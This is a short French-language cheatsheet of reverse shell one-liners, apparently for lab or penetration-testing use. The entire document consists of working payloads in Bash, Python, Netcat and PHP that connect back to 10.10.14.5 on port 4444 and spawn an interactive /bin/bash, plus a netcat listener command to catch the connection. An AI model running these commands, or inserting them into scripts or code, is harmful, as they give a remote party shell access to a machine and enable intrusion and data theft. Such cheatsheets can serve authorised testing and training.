# Reverse Shell Cheatsheet

Quelques commandes utiles pour une reverse shell rapide :

## Bash Reverse Shell
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1



🐍 Python Reverse Shell

python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'



📞 Netcat Reverse Shell

nc -e /bin/bash 10.10.14.5 4444


📡 Listener avec Netcat

nc -lvnp 4444


🧬 PHP Reverse Shell

php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/bash -i <&3 >&3 2>&3");'


